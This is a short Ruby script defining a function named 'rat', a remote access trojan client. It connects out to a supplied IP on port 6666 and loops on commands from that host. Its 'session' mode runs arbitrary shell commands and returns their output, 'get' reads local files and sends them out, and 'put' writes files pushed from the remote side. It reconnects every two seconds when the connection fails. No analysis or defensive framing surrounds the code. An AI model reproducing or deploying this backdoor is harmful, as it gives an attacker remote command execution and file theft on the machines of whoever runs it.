#!/usr/bin/ruby
require 'socket'

def rat(ip)
  begin
    socket = TCPSocket.new(ip, 6666)
    loop do
      command, file, format = socket.gets.chomp.split(' ')
      case command
      when 'session'
        loop do
          cmd = socket.gets.chomp
          if cmd == 'exit'
            break
          end
          begin
            socket.puts `#{cmd}`
          rescue Errno::ENOENT
            socket.puts 'invalid command'
          end
          socket.puts 'done'
        end
      when 'get'
        if format == 'binary'
          file = File.open(file, 'rb')
        elsif format == 'text'
          file = File.open(file, 'r')
        else
          puts 'done'
        end

        content = file.read
        puts content
        socket.puts content
        file.close
        socket.puts 'done'
      when 'put'

        if format == 'binary'
          file = File.open(file,'wb')
        elsif format == 'text'
          file = File.open(file,'w')
        else
          socket.puts 'done'
        end

        loop do
          content = socket.gets.chomp
          if content == 'done'
            break
          end
          file.puts content
        end
        file.close
      end
    end
    # SocketError, Errno::ECONNREFUSED, Errno::ECONNRESET
  rescue
    sleep 2
    retry
  rescue Interrupt
    socket.close
  end

end